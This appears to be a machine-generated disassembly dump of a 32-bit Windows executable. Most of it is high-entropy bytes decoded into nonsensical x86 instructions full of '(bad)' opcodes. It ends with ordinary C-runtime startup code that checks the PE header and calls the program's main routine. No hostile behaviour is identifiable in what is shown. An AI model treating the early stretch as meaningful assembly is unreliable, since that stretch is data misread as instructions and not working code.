  422341:	add    DWORD PTR [ebx-0x65],ebx
  422344:	out    0x79,eax
  422346:	or     ah,bh
  422348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422349:	lods   eax,DWORD PTR ds:[esi]
  42234a:	sbb    esp,DWORD PTR ds:0x2222e161
  422350:	jmp    0xb264ca4e
  422355:	xchg   bh,dh
  422357:	or     BYTE PTR [esi],ah
  422359:	jns    0x4223ac
  42235b:	jne    0x42237d
  42235d:	inc    esi
  42235e:	jns    0x4223b3
  422360:	and    BYTE PTR [edi+esi*1+0x6b],dl
  422364:	xchg   ecx,eax
  422365:	xchg   edx,eax
  422366:	or     DWORD PTR [esi-0x27],ebp
  422369:	lds    eax,FWORD PTR [ebp-0x52c99bed]
  42236f:	jne    0x422330
  422371:	xor    al,0x8e
  422373:	mov    esi,0x34cfa5f3
  422378:	push   0xc18b7701
  42237d:	jge    0x42231d
  42237f:	push   0x17e9c671
  422384:	mov    al,0x7f
  422386:	inc    eax
  422387:	imul   esp,DWORD PTR [ebx+0x6cfae1c3],0x66
  42238e:	inc    esp
  42238f:	add    eax,0x6a052d1f
  422394:	stc    
  422395:	jmp    0x4223b1
  422397:	push   0xec7958b8
  42239c:	push   ebx
  42239d:	pop    ss
  42239e:	ror    DWORD PTR [ebx],cl
  4223a0:	test   al,0xe3
  4223a2:	jge    0x42233b
  4223a4:	in     eax,0xac
  4223a6:	jbe    0x422355
  4223a8:	arpl   WORD PTR [esi-0x26],si
  4223ab:	adc    al,0x2c
  4223ad:	sub    BYTE PTR [esi-0x4f],0xc5
  4223b1:	jg     0x4223de
  4223b3:	mov    ch,0xcb
  4223b5:	(bad)  
  4223b6:	scas   eax,DWORD PTR es:[edi]
  4223b7:	cmc    
  4223b8:	leave  
  4223b9:	ror    DWORD PTR [ebx-0x49742f5f],0x51
  4223c0:	jge    0x42240c
  4223c2:	mov    ?,WORD PTR [esi]
  4223c4:	in     al,dx
  4223c5:	dec    edx
  4223c6:	aaa    
  4223c7:	fbld   TBYTE PTR [edi]
  4223c9:	mov    eax,ds:0xf3bfbadc
  4223ce:	sub    al,0xdc
  4223d0:	pusha  
  4223d1:	mov    dh,al
  4223d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223d4:	mov    dl,0x77
  4223d6:	out    0xea,eax
  4223d8:	pop    es
  4223d9:	mov    ds:0x13a5197d,eax
  4223de:	loopne 0x422402
  4223e0:	mov    bl,0x34
  4223e2:	mov    ebp,0x69061ec9
  4223e7:	(bad)  
  4223e8:	mov    ebp,0x2ca85b38
  4223ed:	outs   dx,BYTE PTR ds:[esi]
  4223ee:	or     ch,BYTE PTR [edi]
  4223f0:	stos   DWORD PTR es:[edi],eax
  4223f1:	mov    edx,DWORD PTR [ecx]
  4223f3:	push   0x22
  4223f5:	push   esi
  4223f6:	(bad)  
  4223f7:	mov    ah,0x65
  4223f9:	mov    bl,0x86
  4223fb:	jp     0x422462
  4223fd:	fidivr WORD PTR [edi+0x43]
  422400:	mov    gs:0x3255136b,al
  422406:	or     ecx,DWORD PTR [edi]
  422408:	and    eax,0x9d1cb8c0
  42240d:	inc    ebp
  42240e:	adc    al,0x8c
  422410:	lock pop eax
  422412:	xchg   esi,eax
  422413:	fsubr  QWORD PTR [edx+0x354be386]
  422419:	jns    0x422489
  42241b:	add    DWORD PTR [edx],ebp
  42241d:	mov    bh,0x93
  42241f:	xchg   ebp,eax
  422420:	in     eax,0x29
  422422:	sub    DWORD PTR [ebp+0x3bfbba5],edi
  422428:	clc    
  422429:	pushf  
  42242a:	dec    edi
  42242b:	sbb    bl,BYTE PTR [eiz*1-0xb7ee3a1]
  422432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422433:	push   ebp
  422434:	fwait
  422435:	push   edx
  422436:	lock inc ecx
  422438:	or     al,0x41
  42243a:	push   eax
  42243b:	(bad)  
  42243c:	pop    esi
  42243d:	jp     0x422417
  42243f:	les    ebx,FWORD PTR [edi-0x41]
  422442:	jge    0x42244d
  422444:	clc    
  422445:	clc    
  422446:	mov    dl,0x9
  422448:	mov    al,0x81
  42244a:	gs mov ah,0xc2
  42244d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244e:	sbb    DWORD PTR ds:0x7f2e6224,0x2e3a646b
  422458:	es addr16 sbb ah,ch
  42245c:	dec    edi
  42245d:	jp     0x42242e
  42245f:	test   eax,0x524a8e4a
  422464:	js     0x4224be
  422466:	adc    eax,0x48af7059
  42246b:	xor    al,0x4
  42246d:	jbe    0x422424
  42246f:	fnsave [ebx+0x2f4cf25f]
  422475:	xor    edi,ebp
  422477:	xlat   BYTE PTR ds:[ebx]
  422478:	jb     0x4224af
  42247a:	pop    es
  42247b:	addr16 adc al,0x40
  42247e:	mov    ebp,fs
  422480:	add    DWORD PTR [eax-0x7],esp
  422483:	push   0x4bc9842a
  422488:	mov    DWORD PTR [esi],esp
  42248a:	jmp    0x422456
  42248c:	pop    eax
  42248d:	inc    edi
  42248e:	fsub   QWORD PTR [ebp+0x3dc5ddf1]
  422494:	dec    BYTE PTR [ebx+0x2f]
  422497:	dec    ebp
  422498:	add    eax,0xc1113427
  42249d:	mov    ch,0x75
  42249f:	popf   
  4224a0:	dec    esp
  4224a1:	pop    eax
  4224a2:	mov    bl,0x1d
  4224a4:	ins    DWORD PTR es:[edi],dx
  4224a5:	lahf   
  4224a6:	xchg   esi,eax
  4224a7:	sub    al,0x98
  4224a9:	mov    WORD PTR [ecx-0x28],?
  4224ac:	out    dx,al
  4224ad:	jle    0x422487
  4224af:	jnp    0x4224f9
  4224b1:	xor    DWORD PTR [edi],ebx
  4224b3:	push   eax
  4224b4:	loop   0x42246b
  4224b6:	sbb    BYTE PTR [ebp+0x3a],al
  4224b9:	ds push edx
  4224bb:	cmp    DWORD PTR [edi+0x7a],edi
  4224be:	rdtsc  
  4224c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224c1:	in     eax,0x73
  4224c3:	ja     0x42250a
  4224c5:	(bad)  
  4224c6:	xor    BYTE PTR [edx-0x44324a7b],dl
  4224cc:	and    esp,edx
  4224ce:	dec    ecx
  4224cf:	imul   esi
  4224d1:	mov    dh,0x5f
  4224d3:	js     0x422537
  4224d5:	push   es
  4224d6:	dec    esi
  4224d7:	(bad)  
  4224d8:	mov    ebx,0x241c78f2
  4224dd:	add    BYTE PTR [ecx-0x205044fd],bh
  4224e3:	lea    ebp,[edx+0x1b915d47]
  4224e9:	dec    esi
  4224ea:	loop   0x42254e
  4224ec:	and    BYTE PTR [ebx+0x20],dh
  4224ef:	test   al,0x79
  4224f1:	std    
  4224f2:	jmp    0xc8ea259d
  4224f7:	je     0x42253c
  4224f9:	int3   
  4224fa:	lea    esp,[edi]
  4224fc:	xchg   esp,eax
  4224fd:	ror    esi,0x57
  422500:	jl     0x422509
  422502:	pop    edx
  422503:	jae    0x4224fe
  422505:	mov    eax,0x7215b426
  42250a:	and    BYTE PTR [edi],bh
  42250c:	mov    ebp,0x67814691
  422511:	xor    ebx,DWORD PTR [edi-0x51]
  422514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422515:	or     ch,BYTE PTR [ecx]
  422517:	aas    
  422518:	push   esi
  422519:	add    edi,esi
  42251b:	mov    edx,0x2aa4a66c
  422520:	mul    DWORD PTR [edi+edi*8]
  422523:	rcl    al,cl
  422525:	xchg   ecx,eax
  422526:	rcr    DWORD PTR [esi+eax*2-0x7f],1
  42252a:	push   ecx
  42252b:	ret    0x15a6
  42252e:	add    BYTE PTR [ebx-0x79],ah
  422531:	and    DWORD PTR [esi+eiz*1],eax
  422534:	jno    0x4224e4
  422536:	daa    
  422537:	out    dx,eax
  422538:	dec    edx
  422539:	cmp    ebx,DWORD PTR [edx-0x7]
  42253c:	mov    BYTE PTR [edi],cl
  42253e:	push   esi
  42253f:	and    al,BYTE PTR [eax+0x5b]
  422542:	inc    ebp
  422543:	in     eax,0x95
  422545:	add    ch,0x23
  422548:	mov    al,0x8e
  42254a:	sahf   
  42254b:	std    
  42254c:	imul   edx,DWORD PTR [edi-0x60],0xfe530c43
  422553:	add    al,0x25
  422555:	out    dx,eax
  422556:	push   0x40
  422558:	int3   
  422559:	dec    ebx
  42255a:	sub    dh,cl
  42255c:	cs cmp al,0x29
  42255f:	arpl   WORD PTR [ebp+0x80234bf],si
  422565:	(bad)  [edx+eiz*4+0x7d]
  422569:	je     0x42257b
  42256b:	cdq    
  42256c:	sub    eax,0x9c519534
  422571:	addr16 pop ds
  422573:	call   0xa07375ca
  422578:	mov    WORD PTR [ebp-0x5b],es
  42257b:	popa   
  42257c:	jns    0x4225cb
  42257e:	push   ebp
  42257f:	push   ecx
  422580:	sbb    BYTE PTR [esi],ah
  422582:	cmp    dl,dl
  422584:	push   edx
  422585:	mov    eax,0xd41fbe4d
  42258a:	bound  esp,QWORD PTR ds:0xd5d8df4e
  422590:	mov    esi,eax
  422592:	(bad)  
  422593:	(bad)  
  422594:	dec    ebx
  422595:	xor    eax,0x3e310ac4
  42259a:	scas   eax,DWORD PTR es:[edi]
  42259b:	shl    BYTE PTR [edx],1
  42259d:	jo     0x4225f1
  42259f:	call   0xaa31:0xc6ea8b50
  4225a6:	es cmc 
  4225a8:	addr16 dec esp
  4225aa:	xor    al,0xde
  4225ac:	lods   eax,DWORD PTR ds:[esi]
  4225ad:	int3   
  4225ae:	mov    edx,0x95ce9e43
  4225b3:	mov    DWORD PTR [ebx-0x27da6ac6],eax
  4225b9:	xchg   ecx,eax
  4225ba:	(bad)  
  4225bb:	mov    edi,0xf0430fe6
  4225c0:	(bad)  
  4225c2:	in     al,0xd1
  4225c4:	(bad)  
  4225c5:	das    
  4225c6:	inc    ecx
  4225c7:	iret   
  4225c8:	popa   
  4225c9:	jne    0x42260f
  4225cb:	out    0x20,eax
  4225cd:	add    eax,DWORD PTR [ecx+0x1716d95c]
  4225d3:	(bad)  
  4225d4:	fdiv   QWORD PTR [edi]
  4225d6:	jnp    0x42255e
  4225d8:	add    bl,BYTE PTR [ebx+0x27]
  4225db:	lock cli 
  4225dd:	repnz in eax,0xaf
  4225e0:	xor    DWORD PTR [esi-0x347f2ae],eax
  4225e6:	jp     0x422622
  4225e8:	ficomp DWORD PTR [esi+0x3c]
  4225eb:	fld    TBYTE PTR [eax+edi*4-0x20]
  4225ef:	mov    esp,0x1425c81c
  4225f4:	xchg   edx,eax
  4225f5:	add    eax,0x7cddf737
  4225fa:	out    dx,al
  4225fb:	(bad)  
  4225fc:	jae    0x4225f5
  4225fe:	ja     0x4225f7
  422600:	cmp    BYTE PTR [edx],ah
  422602:	retf   0xd8f3
  422605:	mov    edi,0x4e33289
  42260a:	(bad)  [eax-0x69010a55]
  422610:	dec    edi
  422611:	mov    WORD PTR [edi],?
  422613:	dec    esi
  422614:	add    al,0xf
  422616:	mov    al,0x95
  422618:	dec    ecx
  422619:	jbe    0x42260c
  42261b:	mov    ah,bl
  42261d:	jl     0x422681
  42261f:	adc    edi,edi
  422621:	pop    edx
  422622:	jns    0x4225a4
  422624:	out    0xc6,al
  422626:	in     al,dx
  422627:	jne    0x42264b
  422629:	imul   ebp,DWORD PTR [eax-0x6f177667],0x7c
  422630:	aaa    
  422631:	loope  0x422605
  422633:	ins    DWORD PTR es:[edi],dx
  422634:	jne    0x4226ad
  422636:	mov    ds:0x1364b070,al
  42263b:	scas   eax,DWORD PTR es:[edi]
  42263c:	sub    DWORD PTR [ecx-0x11a7bd7c],edx
  422642:	push   esp
  422643:	fs retf 0x1738
  422647:	aad    0x9f
  422649:	mov    ebx,0xb3674e82
  42264e:	dec    ebp
  42264f:	fs out dx,eax
  422651:	mov    al,0xf8
  422653:	adc    bl,dl
  422655:	js     0x422663
  422657:	stos   DWORD PTR es:[edi],eax
  422658:	mov    ecx,DWORD PTR [esi]
  42265a:	test   al,0xf7
  42265c:	shr    ecx,1
  42265e:	pop    es
  42265f:	add    BYTE PTR [ecx+0x2f],bh
  422662:	push   cs
  422663:	loope  0x4225f3
  422665:	adc    eax,0x323bf68e
  42266a:	ret    0x1169
  42266d:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42266f:	mov    esi,0x857a4d7a
  422674:	(bad)  
  422675:	xchg   DWORD PTR gs:[eax],ecx
  422678:	out    dx,al
  422679:	test   cl,bh
  42267b:	inc    ebp
  42267c:	jo     0x4226b5
  42267e:	lea    eax,[edx+0x3afa9a18]
  422684:	ss mov al,0xe3
  422687:	rcl    DWORD PTR [edx+0x3c60ebe8],0x5a
  42268e:	or     bl,0x96
  422691:	ins    BYTE PTR es:[edi],dx
  422692:	adc    esp,DWORD PTR [edi+0x493a6482]
  422698:	jl     0x4226db
  42269a:	in     al,dx
  42269b:	sbb    BYTE PTR [ecx-0x1ec96a8c],ah
  4226a1:	in     eax,0xe8
  4226a3:	scas   al,BYTE PTR es:[edi]
  4226a4:	(bad)  
  4226a5:	push   ecx
  4226a6:	pop    ebx
  4226a7:	or     edi,edi
  4226a9:	icebp  
  4226aa:	ja     0x42265b
  4226ac:	(bad)  
  4226ad:	call   0x4261:0xaaa0d7b5
  4226b4:	jp     0x4226e8
  4226b6:	mov    ebp,0xed220656
  4226bb:	xchg   BYTE PTR [esi+ebx*8+0xa1dac0c],al
  4226c2:	push   edi
  4226c3:	push   edi
  4226c4:	mov    al,0xcc
  4226c6:	and    ecx,DWORD PTR [eax+0x169714b0]
  4226cc:	aaa    
  4226cd:	mov    DWORD PTR [ecx+0x45],ebp
  4226d0:	sub    DWORD PTR [esi+0x64],edx
  4226d3:	arpl   WORD PTR [eax],di
  4226d5:	lods   eax,DWORD PTR ds:[esi]
  4226d6:	leave  
  4226d7:	jae    0x4226a6
  4226d9:	push   esi
  4226da:	xor    al,0xb
  4226dc:	(bad)  
  4226de:	add    al,0x6c
  4226e0:	mov    al,0x49
  4226e2:	push   edi
  4226e3:	mov    dl,0xcb
  4226e5:	popf   
  4226e6:	sbb    BYTE PTR [edi+0x4b13ba06],bl
  4226ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ed:	pop    edx
  4226ee:	test   al,0xe6
  4226f0:	adc    BYTE PTR [eax],0x50
  4226f3:	lods   eax,DWORD PTR ds:[esi]
  4226f4:	cmp    eax,0x160831ac
  4226f9:	mov    esp,0x9fd8164f
  4226fe:	xchg   edi,eax
  4226ff:	je     0x422699
  422701:	cmp    bh,BYTE PTR [ecx]
  422703:	dec    edi
  422704:	mov    dh,0x33
  422706:	into   
  422707:	xor    eax,0xf14509de
  42270c:	clc    
  42270d:	fmul   DWORD PTR [ecx-0x41]
  422710:	cmp    cl,dl
  422712:	rol    DWORD PTR [edx],0xaf
  422715:	mov    edx,0x85cb53de
  42271a:	stos   DWORD PTR es:[edi],eax
  42271b:	pop    ebx
  42271c:	adc    ebx,0x5105cbb8
  422722:	cmp    DWORD PTR [edx-0x38],edx
  422725:	adc    eax,0xfcb41a31
  42272a:	or     BYTE PTR [edi+0x2e],dl
  42272d:	neg    BYTE PTR [edi-0x53]
  422730:	push   esi
  422731:	int3   
  422732:	pop    esp
  422733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422734:	or     eax,0x6bf72538
  422739:	dec    eax
  42273a:	scas   eax,DWORD PTR es:[edi]
  42273b:	xchg   edi,eax
  42273c:	inc    esp
  42273d:	mov    ah,0x48
  42273f:	pop    ebp
  422740:	jmp    0x4226f1
  422742:	xchg   ecx,eax
  422743:	inc    edi
  422744:	shl    BYTE PTR [ecx+edx*4+0x48c71ec],cl
  42274b:	retf   0x184a
  42274e:	call   0x260532b
  422753:	cli    
  422754:	sbb    edi,ecx
  422756:	mov    ds:0x8534151a,al
  42275b:	(bad)  
  42275c:	push   eax
  42275d:	mov    eax,ds:0xec15ec45
  422762:	push   cs
  422763:	pop    edi
  422764:	or     DWORD PTR [edi+ebx*4],ebp
  422767:	and    eax,0x81a099e8
  42276c:	mov    edi,0xc6d23b92
  422771:	mov    WORD PTR [esp+eax*2],?
  422774:	gs push esi
  422776:	fst    DWORD PTR [ecx]
  422778:	dec    BYTE PTR [eax]
  42277a:	adc    DWORD PTR [ecx],ecx
  42277c:	inc    eax
  42277d:	fcmovb st,st(6)
  42277f:	inc    ebp
  422780:	rcl    ebx,1
  422782:	push   esi
  422783:	xchg   esp,eax
  422784:	jnp    0x42276b
  422786:	add    eax,0xc6ad99dd
  42278b:	(bad)  
  42278c:	cs pop ss
  42278e:	das    
  42278f:	in     al,dx
  422790:	mov    edi,0x97484361
  422795:	rol    bh,0xff
  422798:	sub    eax,0xf93fe343
  42279d:	xchg   BYTE PTR [eax+0x2551c217],bl
  4227a3:	cmc    
  4227a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a5:	push   ebx
  4227a6:	xchg   esp,eax
  4227a7:	lods   eax,DWORD PTR ds:[esi]
  4227a8:	mov    edx,0x5a519ec2
  4227ad:	sahf   
  4227ae:	inc    edi
  4227af:	inc    eax
  4227b0:	test   DWORD PTR [esp+eax*1],ebp
  4227b3:	jge    0x422749
  4227b5:	fcmove st,st(1)
  4227b7:	lods   eax,DWORD PTR ds:[esi]
  4227b8:	push   esp
  4227b9:	push   esi
  4227ba:	lods   al,BYTE PTR ds:[esi]
  4227bb:	enter  0x7822,0xe0
  4227bf:	icebp  
  4227c0:	mov    edx,0xfd52f5f1
  4227c5:	aaa    
  4227c6:	xor    eax,DWORD PTR [edi]
  4227c8:	sub    eax,0x2726cb65
  4227cd:	neg    DWORD PTR [eax]
  4227cf:	add    al,0xec
  4227d1:	(bad)  
  4227d2:	call   0x2e81751d
  4227d7:	shl    DWORD PTR [edi+0x1cc6440d],0xe6
  4227de:	adc    edi,DWORD PTR [ebx-0x792fbc8]
  4227e4:	pop    esp
  4227e5:	adc    eax,0x2db148b4
  4227ea:	push   ds
  4227eb:	dec    ecx
  4227ec:	(bad)  
  4227ee:	mov    edi,0xe1b11b2a
  4227f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227f4:	in     al,0x95
  4227f6:	pop    esp
  4227f7:	call   0x8eb3:0x68bd4fb6
  4227fe:	sbb    BYTE PTR [esi-0x576b4d73],ah
  422804:	fmulp  st(7),st
  422806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422807:	dec    edi
  422808:	push   ebp
  422809:	mov    ds:0x4b6c58fa,al
  42280e:	sahf   
  42280f:	add    al,0x82
  422811:	push   esi
  422812:	inc    ebx
  422813:	je     0x4227bb
  422815:	xchg   ebp,edx
  422817:	sbb    BYTE PTR [ecx],cl
  422819:	sahf   
  42281a:	cwde   
  42281b:	mov    ch,0xf
  42281d:	lods   eax,DWORD PTR ds:[esi]
  42281e:	pop    edi
  42281f:	jb     0x42281d
  422821:	dec    esi
  422822:	add    al,BYTE PTR [ecx]
  422824:	scas   al,BYTE PTR es:[edi]
  422825:	add    ah,BYTE PTR [ecx-0x78fe41a8]
  42282b:	pop    eax
  42282c:	mov    cl,0xb0
  42282e:	mov    BYTE PTR [ebp-0x2455769b],dl
  422834:	xor    edx,DWORD PTR ds:0x9820b887
  42283a:	cmp    BYTE PTR [esi-0x17d46699],ah
  422840:	mov    ebx,0x9a64e5bc
  422845:	cmp    DWORD PTR [ebx-0x71],0x74
  422849:	(bad)  
  42284a:	retf   0x8b9
  42284d:	out    0xdf,eax
  42284f:	push   ss
  422850:	xlat   BYTE PTR ds:[ebx]
  422851:	sub    al,0x51
  422853:	fadd   QWORD PTR [ebx]
  422855:	xchg   edx,eax
  422856:	mul    DWORD PTR [eax]
  422858:	(bad)  
  422859:	fidiv  WORD PTR [esi-0x4ebf064b]
  42285f:	mov    eax,ds:0x40a5e7e4
  422864:	mov    bl,0x2a
  422866:	and    al,0x89
  422868:	popf   
  422869:	je     0x4228a9
  42286b:	(bad)  [esi+0x4d7fd680]
  422871:	xor    esi,DWORD PTR [edx]
  422873:	xor    bl,ch
  422875:	lods   al,BYTE PTR ds:[esi]
  422876:	(bad)  [esi]
  422878:	xchg   edx,eax
  422879:	xchg   BYTE PTR [eax+eax*4],dh
  42287c:	popf   
  42287d:	push   DWORD PTR [ebx]
  42287f:	adc    DWORD PTR ds:0x35376575,esi
  422885:	(bad)  
  422886:	daa    
  422887:	mov    eax,0xdc150201
  42288c:	in     eax,dx
  42288d:	lods   al,BYTE PTR ds:[esi]
  42288e:	loope  0x4228fa
  422890:	leave  
  422891:	ds loop 0x42288d
  422894:	jl     0x42281a
  422896:	(bad)  
  422897:	ja     0x422857
  422899:	xchg   edx,eax
  42289a:	ss addr16 inc ebx
  42289d:	enter  0x9dd9,0x39
  4228a1:	cmp    al,0x4a
  4228a3:	sbb    ch,BYTE PTR [eax-0x16756694]
  4228a9:	xchg   esi,eax
  4228aa:	stos   BYTE PTR es:[edi],al
  4228ab:	les    edx,FWORD PTR [esi+edx*8-0x4669bd6b]
  4228b2:	add    BYTE PTR [edx-0x18ed0c2b],cl
  4228b8:	pop    edi
  4228b9:	lock sbb DWORD PTR ss:[esi-0x48aeb53b],0x60
  4228c2:	jns    0x422909
  4228c4:	(bad)  
  4228c5:	or     al,0xb6
  4228c7:	xor    al,0xec
  4228c9:	push   0x35
  4228cb:	popf   
  4228cc:	mov    BYTE PTR [eax],ch
  4228ce:	mov    al,0xea
  4228d0:	add    BYTE PTR [esi-0x24ec774],bh
  4228d6:	sub    DWORD PTR [ebp-0x5cd10bac],edi
  4228dc:	test   eax,0x441be961
  4228e1:	iret   
  4228e2:	sub    ecx,ebp
  4228e4:	pop    esp
  4228e5:	aas    
  4228e6:	cli    
  4228e7:	mov    esi,0xc73771b3
  4228ec:	inc    BYTE PTR [edi]
  4228ee:	imul   esi,DWORD PTR [edx-0x6],0xffffffc7
  4228f2:	xor    dh,bh
  4228f4:	popf   
  4228f5:	xchg   edx,eax
  4228f6:	push   esp
  4228f7:	and    ebx,DWORD PTR [edx+0x6b4022c6]
  4228fd:	sub    bl,BYTE PTR [edi+0x32]
  422900:	ins    BYTE PTR es:[edi],dx
  422901:	retf   0xc1f6
  422904:	inc    esp
  422905:	fsub   QWORD PTR [edi+0x6b]
  422908:	test   BYTE PTR [edx],bh
  42290a:	xor    DWORD PTR [ecx],ecx
  42290c:	icebp  
  42290d:	call   0x25064a87
  422912:	push   edi
  422913:	div    BYTE PTR [eax-0x1a743fcd]
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
